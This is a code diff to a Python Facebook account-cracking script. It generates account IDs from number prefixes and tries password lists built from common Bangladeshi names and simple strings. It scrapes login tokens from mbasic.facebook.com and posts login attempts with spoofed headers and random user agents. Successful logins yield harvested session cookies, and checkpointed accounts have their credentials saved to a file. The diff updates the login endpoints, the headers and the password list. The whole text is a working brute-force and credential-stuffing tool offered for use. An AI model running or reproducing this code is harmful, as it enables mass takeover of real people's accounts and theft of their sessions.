@@ -244,8 +244,9 @@ def umo_in():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         shoha()
         for love in user:
-            pwx = [love[1:]]
-            uid = code+love
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangla','09876543','@#@#@#','BANGLADESH','Bangladesh','bangladesh','Free fire','free fire','I Love You','I love you','i love you','123@@@','@@@###','nusrat','jannat','sadiya','Farjana','Sultana','fatema','Mimmim','samiya','soniya','tamanna','nadiya','Ramjan','Md Jahidul Islam','Jahidul','Shakil','Badsha','Tanjila','Rashel','Mohammad','113355','22334455','121235','1234567890']
+            yaari.submit(SAMIRM1,uid,pwx,tl)
             for Eman in HamiiID:
                 pwx.append(Eman)
                 pwx.append(love)
@@ -261,7 +262,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -273,11 +274,13 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            "method": 'POST',
-            "scheme": 'https',
+            'method':'GET',
+            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+            'scheme':'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
+            'referer': 'https://mbasic.facebook.com/',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
             'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
@@ -286,11 +289,11 @@ def rcrack(uid,pwx,tl):
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            "user-agent": pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -303,7 +306,7 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\r\r\33[1;31m [IRFAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('\r\r\33[1;31m [IRFAN-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/DEATH-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
